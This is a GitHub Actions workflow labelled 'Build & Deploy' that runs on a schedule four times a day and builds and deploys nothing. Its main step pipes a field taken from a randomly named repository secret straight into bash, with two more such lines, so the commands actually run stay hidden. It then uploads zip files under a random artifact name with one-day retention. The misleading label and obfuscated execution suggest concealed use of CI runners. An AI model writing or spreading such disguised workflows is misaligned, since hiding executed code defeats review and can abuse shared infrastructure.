name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '49 1,7,13,19 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Main step
        env:
          bxyl849: ${{ secrets.bxyl849 }}
        run: |
          printf '%s' "$bxyl849" | jq -r .wqvqa85 | /bin/bash
          echo $ri05230 | jq -r .eod1248 | /bin/bash
          echo $beiy3 | jq -r .rothw6592 | /bin/bash

      - name: Save data
        uses: actions/upload-artifact@v4
        with:
          name: ONjNR4NM
          path: "*.zip"
          retention-days: 1
